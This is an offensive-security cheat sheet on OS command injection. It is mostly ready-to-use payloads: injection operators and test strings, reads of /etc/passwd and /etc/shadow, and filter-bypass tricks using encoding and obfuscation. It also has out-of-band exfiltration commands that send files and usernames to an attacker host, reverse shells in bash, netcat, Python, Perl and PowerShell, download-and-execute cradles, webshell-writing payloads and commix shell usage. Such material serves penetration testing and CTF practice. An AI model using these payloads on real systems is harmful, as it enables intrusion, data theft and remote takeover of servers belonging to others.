# Command Injection Playbook

Complete reference for detecting and exploiting OS command injection vulnerabilities. Covers injection operators, blind detection, filter bypasses, and escalation to reverse shell across Linux and Windows targets.

---

## Table of Contents

- [What Is Command Injection](#what-is-command-injection)
- [Spotting It](#spotting-it)
- [Injection Operators](#injection-operators)
- [Basic Exploitation](#basic-exploitation)
- [Blind Command Injection](#blind-command-injection)
- [Filter Bypasses](#filter-bypasses)
- [Reverse Shells From Command Injection](#reverse-shells-from-command-injection)
- [Language-Specific Vulnerable Functions](#language-specific-vulnerable-functions)
- [Injection in Common Features](#injection-in-common-features)
- [Windows-Specific Injection](#windows-specific-injection)
- [Tools](#tools)
- [Quick Reference](#quick-reference)

---

## What Is Command Injection

The application passes user input into an OS command without proper sanitization. The attacker appends their own commands using shell operators.

```
User input: 8.8.8.8; id
Server runs: ping -c 4 8.8.8.8; id
                                 ^^^^ attacker's command executes
```

Versus **code injection** (eval/exec of the app's language) — command injection targets the **OS shell** directly.

---

## Spotting It

### Vulnerable Parameters

Any input that interacts with system utilities is a candidate:

```
# Network tools
?ip=8.8.8.8             → ping, traceroute, nslookup, dig
?host=example.com        → DNS lookups, curl, wget
?url=http://example.com  → curl, wget, file fetch

# File operations
?filename=report.pdf     → cat, file, convert, ffmpeg
?path=/tmp/data          → ls, find, stat
?dir=/var/log            → ls, dir

# System utilities
?domain=example.com      → whois, nslookup
?target=10.0.0.1         → nmap, ping
?user=admin              → finger, id, getent
?cmd=status              → service, systemctl
?process=apache          → ps, kill
?archive=backup.tar.gz   → tar, unzip, 7z

# PDF/image/document processing
?file=input.docx         → libreoffice, convert, pandoc
?image=photo.jpg         → convert, exiftool, ffmpeg
```

### Quick Test Payloads

Try these in every input field, URL parameter, HTTP header, and cookie:

```bash
# Inline execution — append a command
; id
; whoami
| id
|| id
& id
&& id
`id`
$(id)

# Newline injection (URL-encoded)
%0a id
%0d%0a id

# If the input expects a number or specific format, try:
127.0.0.1; id
127.0.0.1 | id
8.8.8.8%0a id
test`id`
test$(id)
```

### Confirming Injection

**Output reflected in response:**
```bash
# You see command output in the page
?ip=127.0.0.1;id
# Response contains: uid=33(www-data) gid=33(www-data)
```

**No output (blind) — use time delay:**
```bash
# If the response is delayed by 5 seconds → blind injection confirmed
?ip=127.0.0.1;sleep+5
?ip=127.0.0.1|sleep+5
?ip=127.0.0.1$(sleep+5)
?ip=127.0.0.1%0asleep+5

# Windows
?ip=127.0.0.1&ping+-n+6+127.0.0.1        # ~5 second delay
?ip=127.0.0.1|timeout+/t+5+/nobreak
```

---

## Injection Operators

### Linux

| Operator | Behavior | Example |
|----------|----------|---------|
| `;` | Execute sequentially (regardless of first command's result) | `ping 8.8.8.8; id` |
| `\|` | Pipe — send output of first to second | `ping 8.8.8.8 \| id` |
| `\|\|` | Execute second only if first **fails** | `invalid \|\| id` |
| `&&` | Execute second only if first **succeeds** | `ping 8.8.8.8 && id` |
| `` `cmd` `` | Backtick substitution — execute inline | `` ping `id` `` |
| `$(cmd)` | Subshell substitution — execute inline | `ping $(id)` |
| `%0a` | Newline — acts like `;` | `ping 8.8.8.8%0aid` |
| `%0d%0a` | CRLF newline | `ping 8.8.8.8%0d%0aid` |
| `#` | Comment out the rest | `; id #` |

**Key difference:** `;` and `\n` always run both commands. `&&` only runs the second if the first succeeds. `\|\|` only runs the second if the first fails.

### Windows (cmd.exe)

| Operator | Behavior | Example |
|----------|----------|---------|
| `&` | Execute both commands | `ping 8.8.8.8 & whoami` |
| `&&` | Second only if first succeeds | `ping 8.8.8.8 && whoami` |
| `\|` | Pipe output | `ping 8.8.8.8 \| whoami` |
| `\|\|` | Second only if first fails | `invalid \|\| whoami` |
| `%0a` | Newline | `ping 8.8.8.8%0awhoami` |

**Note:** Backticks and `$()` do NOT work in Windows cmd.exe. They work in PowerShell:
```powershell
# PowerShell subexpression
ping $(whoami)
```

### Universal (Work on Both)

```
| id                    pipe
|| id                   OR
& id                    background/both (Linux bg, Windows both)
%0a id                  newline
```

---

## Basic Exploitation

### With Output

```bash
# Enumerate the system
?ip=127.0.0.1;id
?ip=127.0.0.1;whoami
?ip=127.0.0.1;uname+-a
?ip=127.0.0.1;cat+/etc/passwd
?ip=127.0.0.1;ls+-la+/home
?ip=127.0.0.1;cat+/home/user/user.txt
?ip=127.0.0.1;ip+a
?ip=127.0.0.1;ss+-tlnp
?ip=127.0.0.1;env
?ip=127.0.0.1;cat+/etc/shadow

# Find flags
?ip=127.0.0.1;find+/+-name+"*.txt"+-type+f+2>/dev/null
?ip=127.0.0.1;find+/+-name+"flag*"+2>/dev/null

# Read source code
?ip=127.0.0.1;cat+/var/www/html/index.php
?ip=127.0.0.1;cat+/var/www/html/config.php

# Windows
?ip=127.0.0.1&whoami
?ip=127.0.0.1&type+C:\Users\Administrator\Desktop\proof.txt
?ip=127.0.0.1&dir+C:\Users
?ip=127.0.0.1&net+user
?ip=127.0.0.1&systeminfo
```

### Inline Substitution

When the app uses your input mid-command, backticks and `$()` inject inside the original command:

```bash
# App runs: nslookup <input>
# Payload:  $(id)
# Becomes:  nslookup uid=33(www-data)...
# The command output replaces the substitution

# If reflected in error message:
# "Could not resolve host: uid=33(www-data)"
# → confirms execution even though nslookup "failed"
```

---

## Blind Command Injection

No output in the response. You need out-of-band or time-based confirmation.

### Time-Based Detection

```bash
# Linux — measure response time
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
%0a sleep 5

# Windows
& ping -n 6 127.0.0.1          # ~5 seconds (pings + 1)
& timeout /t 5 /nobreak
| powershell -c "Start-Sleep 5"
```

**Tip:** Use 5 or 10 seconds. Shorter delays could be coincidental latency.

### Out-of-Band (OOB) — DNS Exfiltration

Make the target resolve a DNS name you control — the lookup confirms execution, and the subdomain carries data.

```bash
# Using Burp Collaborator or interactsh
; nslookup $(whoami).YOUR_COLLAB_DOMAIN
; host $(id | base64).YOUR_COLLAB_DOMAIN
; ping -c 1 $(whoami).YOUR_COLLAB_DOMAIN

# Using interactsh
interactsh-client
# Copy the domain, e.g., abc123.oast.fun
; curl abc123.oast.fun/$(whoami)
; nslookup $(whoami).abc123.oast.fun

# Exfiltrate file content
; curl http://ATTACKER/$(cat+/etc/hostname)
; wget http://ATTACKER/$(whoami)
; nslookup $(cat+/etc/hostname).abc123.oast.fun

# Base64 encode for special characters
; curl http://ATTACKER/$(cat+/etc/passwd|base64|tr+'\n'+'-')
```

### OOB — HTTP Callback

```bash
# Start listener on attacker
python3 -m http.server 8080

# Trigger callback from target
; curl http://ATTACKER:8080/$(whoami)
; wget -q http://ATTACKER:8080/$(id) -O /dev/null
; curl http://ATTACKER:8080/ -d @/etc/passwd

# Windows
& certutil -urlcache -f http://ATTACKER:8080/$(whoami) NUL
& powershell -c "Invoke-WebRequest http://ATTACKER:8080/$env:USERNAME"
& curl http://ATTACKER:8080/%USERNAME%
```

### OOB — Write + Read via LFI

If you also have LFI or file read access:

```bash
# Write command output to a web-accessible file
; id > /var/www/html/output.txt
; cat /etc/passwd > /var/www/html/out.txt

# Read it
curl http://TARGET/output.txt
```

---

## Filter Bypasses

### Space Bypass

Many filters block spaces. Alternatives:

```bash
# Linux
;cat</etc/passwd                         # input redirection (no space)
${IFS}                                    # Internal Field Separator = space
;cat${IFS}/etc/passwd                     # works everywhere
;cat$IFS/etc/passwd                       # also works
{cat,/etc/passwd}                         # brace expansion
cat%09/etc/passwd                         # horizontal tab (%09)
;X=$'cat\x20/etc/passwd'&&$X             # hex-encoded space
;cat%20/etc/passwd                        # URL-encoded space (if decoded)

# Windows
;type%09C:\Windows\win.ini               # tab
;type,C:\Windows\win.ini                  # comma separator
```

### Slash (/) Bypass

```bash
# Use environment variables
;cat ${HOME:0:1}etc${HOME:0:1}passwd     # ${HOME} = /root → ${HOME:0:1} = /

# Use printf
;cat $(printf '\x2f')etc$(printf '\x2f')passwd

# Use echo
;cat $(echo /)etc$(echo /)passwd
```

### Command Blacklist Bypass

When specific commands like `cat`, `ls`, `id`, `whoami` are blocked:

```bash
# Alternative commands for cat
tac /etc/passwd               # reverse cat
nl /etc/passwd                # numbered lines
head /etc/passwd
tail /etc/passwd
more /etc/passwd
less /etc/passwd
sort /etc/passwd
uniq /etc/passwd
rev /etc/passwd | rev         # reverse twice = original
xxd /etc/passwd               # hex dump
od -c /etc/passwd             # octal dump
sed '' /etc/passwd            # sed with no operation
awk '{print}' /etc/passwd
strings /etc/passwd
cut -d: -f1 /etc/passwd
paste /etc/passwd

# Alternative for whoami
id
echo $USER
printenv USER
logname

# Alternative for ls
dir                           # often available
find . -maxdepth 1
echo *                        # glob expansion
printf '%s\n' *

# Alternative for ifconfig/ip
hostname -I
ss -tlnp
cat /proc/net/tcp
```

### String Concatenation Bypass

Break blacklisted commands into parts the filter doesn't recognize:

```bash
# Concatenation with empty strings
;w'h'o'am'i                 → whoami
;w"h"o"am"i                 → whoami

# Variable concatenation
;a=wh;b=oami;$a$b           → whoami
;a=ca;b=t;$a$b /etc/passwd  → cat /etc/passwd

# Backslash insertion (shell ignores \ before normal chars)
;w\ho\am\i                   → whoami
;c\at /e\tc/p\as\sw\d        → cat /etc/passwd

# Wildcard substitution
;/b?n/ca? /et?/passw?        → /bin/cat /etc/passwd
;/b??/c?t /???/p??s?d        → /bin/cat /etc/passwd
;/bin/c[a]t /etc/passwd       → /bin/cat /etc/passwd

# Reverse command
;$(echo 'dmanohw' | rev)      → whoami
;$(echo 'dwssap/cte/ tac' | rev)  → cat /etc/passwd
```

### Encoding Bypasses

```bash
# Base64 encoded command
;echo d2hvYW1p | base64 -d | sh                  # whoami
;echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh       # cat /etc/passwd
;bash<<<$(base64 -d<<<d2hvYW1p)                    # whoami (no pipes)

# Hex encoded
;echo -e '\x69\x64' | sh                          # id
;printf '\x77\x68\x6f\x61\x6d\x69' | sh           # whoami

# Octal
;$'\167\150\157\141\155\151'                       # whoami

# URL encoding (if server decodes before shell)
%3B%20id                                           # ; id
%7C%20id                                           # | id
```

### Character Blacklist Bypass

```bash
# Semicolon ; blocked → use newline or other operators
%0a id                        # newline
| id                          # pipe
|| id                         # OR
& id                          # background
$() and ``                    # subshell

# Pipe | blocked → use semicolons or newlines
; id
%0a id
`id`
$(id)

# Ampersand & blocked
; id
| id
%0a id

# Quotes blocked
# Use $() instead of backticks, no quotes needed:
$(cat /etc/passwd)

# Dollar sign $ blocked
`id`                          # use backticks instead of $()
;id                           # use ; instead of $()
```

---

## Reverse Shells From Command Injection

### Linux

```bash
# bash reverse shell (most reliable)
;bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
# URL-encoded:
;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'

# mkfifo + nc
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f

# nc -e (if available)
;nc -e /bin/sh ATTACKER 4444
;nc -e /bin/bash ATTACKER 4444

# Python
;python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),i) for i in(0,1,2)];subprocess.call(["/bin/sh","-i"])'

# Perl
;perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# curl + sh (download and execute)
;curl http://ATTACKER/rev.sh | sh

# With space bypass
;bash${IFS}-c${IFS}'bash${IFS}-i${IFS}>&${IFS}/dev/tcp/ATTACKER/4444${IFS}0>&1'
```

### Windows

```bash
# PowerShell reverse shell
& powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# Download + execute
& certutil -urlcache -split -f http://ATTACKER/rev.exe C:\Windows\Temp\rev.exe
& C:\Windows\Temp\rev.exe

# PowerShell download cradle
& powershell IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/Invoke-PowerShellTcp.ps1')

# Nishang
& powershell IEX(IWR http://ATTACKER/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER -Port 4444
```

---

## Language-Specific Vulnerable Functions

### PHP

```php
system()              // Executes command, outputs result
exec()                // Executes command, returns last line
shell_exec()          // Executes via shell, returns full output
passthru()            // Executes command, raw binary output
popen()               // Opens process pipe
proc_open()           // Advanced process control
pcntl_exec()          // Replaces current process
``  (backticks)       // Shorthand for shell_exec()
```

### Python

```python
os.system()           # Executes via shell
os.popen()            # Opens pipe to command
subprocess.call()     # Runs command
subprocess.Popen()    # Advanced process
subprocess.run()      # Python 3.5+ preferred
commands.getoutput()  # Deprecated but still seen
```

### Node.js

```javascript
child_process.exec()       // Executes in shell — VULNERABLE
child_process.execSync()   // Synchronous shell exec
child_process.spawn()      // Safer (no shell by default)
// exec() is the main target — it invokes /bin/sh
```

### Ruby

```ruby
system()              # Executes in shell
exec()                # Replaces process
`cmd`                 # Backticks — shell exec
%x(cmd)               # Same as backticks
IO.popen()            # Pipe to command
Open3.capture3()      # Capture stdout/stderr
Kernel.open()         # If argument starts with | → command exec!
```

### Java

```java
Runtime.getRuntime().exec()           // Direct execution
ProcessBuilder                        // Process builder
// Note: Java doesn't use a shell by default
// Injection is harder but possible if input reaches shell via:
// Runtime.exec(new String[]{"/bin/sh", "-c", userInput})
```

---

## Injection in Common Features

### Ping / Network Diagnostic

```bash
# Most common CTF injection point
# App code: system("ping -c 4 " . $_GET['ip'])
127.0.0.1; id
127.0.0.1 | id
127.0.0.1 & id
```

### DNS Lookup

```bash
# App code: system("nslookup " . $_GET['host'])
example.com; id
example.com | id
$(id).example.com                        # subdomain injection
```

### File Conversion / Processing

```bash
# App processes uploaded files with ImageMagick, ffmpeg, LibreOffice, etc.
# Filename injection:
;id;.jpg                                 # if filename reaches shell
$(id).jpg

# ImageMagick (CVE-2016-3714 — ImageTragick)
# Create malicious SVG/MVG file
```

### Email / Contact Forms

```bash
# App code: mail($to, $subject, $body, "From: " . $_POST['email'])
# Header injection for command exec (if passed to sendmail):
attacker@evil.com -OQueueDirectory=/tmp -X/var/www/html/shell.php
# Then send PHP code in the body
```

### Git / Version Control

```bash
# App runs: git clone <user_input>
# Inject via repo URL:
http://evil.com/repo;id
--upload-pack='touch /tmp/pwned'
```

### Curl / URL Fetch (SSRF → Command Injection)

```bash
# App code: system("curl " . $_GET['url'])
http://example.com;id
http://example.com -o /var/www/html/shell.php -d '<?php system($_GET["c"]); ?>'
# Downloads and writes a webshell
```

### Archive Extraction

```bash
# App code: system("tar xzf " . $filename)
# Craft filename:
;id;.tar.gz
$(id).tar.gz
```

### PDF / Document Generation

```bash
# wkhtmltopdf, puppeteer, headless Chrome
# Inject into HTML that gets rendered:
<img src="x" onerror="document.write(require('child_process').execSync('id').toString())">

# Server-side XSS → SSRF → file read
<iframe src="file:///etc/passwd">
<script>x=new XMLHttpRequest();x.open("GET","file:///etc/passwd");x.send();document.write(x.responseText)</script>
```

---

## Windows-Specific Injection

### cmd.exe Operators

```cmd
& whoami                         rem both commands run
&& whoami                        rem second only if first succeeds
| whoami                         rem pipe
|| whoami                        rem second only if first fails
```

### PowerShell Subexpressions

```powershell
$(whoami)                         # subexpression
;whoami                           # statement separator
```

### Useful Windows Commands

```cmd
& whoami
& whoami /priv
& systeminfo
& net user
& net localgroup Administrators
& ipconfig /all
& dir C:\Users
& type C:\Users\Administrator\Desktop\proof.txt
& type C:\Users\Administrator\Desktop\root.txt
& tasklist
& sc query
& reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
& cmdkey /list
```

### Windows Space Bypass

```cmd
& type%09C:\Windows\win.ini                # tab
& type,C:\Windows\win.ini                  # comma works in cmd
& for,/f,"tokens=*",%%a,in,('whoami'),do,echo,%%a
```

---

## Tools

| Tool | Purpose | Command |
|------|---------|---------|
| `commix` | Automated command injection exploitation | `commix -u "http://TARGET/ping.php?ip=127.0.0.1"` |
| `Burp Suite` | Intercept and modify injection payloads | Intruder with command injection lists |
| `interactsh` | OOB DNS/HTTP callback server | `interactsh-client` |
| `revshells.com` | Generate reverse shell one-liners | Browser tool |

### commix Examples

```bash
# Auto-detect and exploit
commix -u "http://TARGET/ping.php?ip=127.0.0.1"

# POST parameter
commix -u "http://TARGET/ping.php" --data="ip=127.0.0.1"

# With authentication
commix -u "http://TARGET/ping.php?ip=127.0.0.1" --cookie="PHPSESSID=abc123"

# Specific technique
commix -u "http://TARGET/ping.php?ip=127.0.0.1" --technique=T  # time-based
commix -u "http://TARGET/ping.php?ip=127.0.0.1" --os-cmd="id"  # one-shot

# Get a shell
commix -u "http://TARGET/ping.php?ip=127.0.0.1" --os-shell
```

---

## Quick Reference

```
┌──────────────────────────────────────────────────────────────────┐
│                    DETECTION                                     │
│                                                                  │
│  With output:    ;id   |id   ||id   $(id)   `id`                │
│  Blind (time):   ;sleep 5   $(sleep 5)   |sleep 5               │
│  Blind (OOB):    ;curl http://ATTACKER/$(whoami)                 │
│  Blind (DNS):    ;nslookup $(whoami).COLLAB_DOMAIN               │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│                  OPERATORS                                       │
│                                                                  │
│  ;       run both (Linux)                                        │
│  |       pipe                                                    │
│  ||      run second if first fails                               │
│  &&      run second if first succeeds                            │
│  &       both (Windows cmd) / background (Linux)                 │
│  $()     subshell substitution                                   │
│  ``      backtick substitution                                   │
│  %0a     newline                                                 │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│                  FILTER BYPASSES                                 │
│                                                                  │
│  Space blocked:  ${IFS}  %09(tab)  {cmd,arg}  <input_redir      │
│  Cmd blacklist:  w'h'o'am'i  w\ho\am\i  /b??/c?t  $a$b concat  │
│  Char blacklist: %0a(newline)  encoding  alt operators           │
│  Slash blocked:  ${HOME:0:1}  $(printf '\x2f')                  │
│  Encoding:       base64 -d | sh   printf '\xHH' | sh            │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│                  ESCALATE TO SHELL                               │
│                                                                  │
│  Linux:  ;bash -c 'bash -i >& /dev/tcp/ATK/4444 0>&1'           │
│          ;curl http://ATK/rev.sh|sh                              │
│          ;nc -e /bin/sh ATK 4444                                 │
│                                                                  │
│  Windows: &powershell IEX(...DownloadString('http://ATK/sh.ps1'))│
│           &certutil -urlcache -f http://ATK/r.exe C:\Temp\r.exe  │
│                                                                  │
├──────────────────────────────────────────────────────────────────┤
│                  AUTOMATION                                      │
│                                                                  │
│  commix -u "http://TARGET/?ip=127.0.0.1" --os-shell             │
│  commix -u URL --data="ip=127.0.0.1" --os-cmd="id"              │
│                                                                  │
└──────────────────────────────────────────────────────────────────┘
```

## References

- [HackTricks — Command Injection](https://book.hacktricks.wiki/en/pentesting-web/command-injection.html)
- [PayloadsAllTheThings — Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [OWASP — OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [commix — Automated Command Injection](https://github.com/commixproject/commix)
- [RevShells — Reverse Shell Generator](https://www.revshells.com/)
